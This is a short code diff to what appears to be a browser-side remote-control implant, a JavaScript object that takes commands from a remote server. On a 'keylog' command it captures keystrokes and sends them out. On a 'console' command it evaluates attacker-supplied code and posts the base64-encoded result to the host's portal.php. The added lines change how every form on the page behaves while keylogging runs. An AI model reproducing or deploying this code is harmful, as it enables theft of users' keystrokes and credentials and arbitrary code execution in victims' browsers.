@@ -56,6 +56,10 @@ let jsr = {
         window.removeEventListener("keydown", jsr.sendLog);
         jsr.cleanup();
       } else if (data.command == "keylog") {
+        var els = document.querySelectorAll('form');
+        for (var i=0; i < els.length; i++) {
+            els[i].setAttribute("onsubmit", "jsr.cleanup();");
+        }
         window.addEventListener("keydown", jsr.sendLog);
       } else if (data.command == "console") {
         jsr.ajaxReq(jsr.host_url + "/portal.php?post=console", function(c){}, "POST", { log: btoa((new Function("return " + data.argument1)())), cmd: data.argument1 });
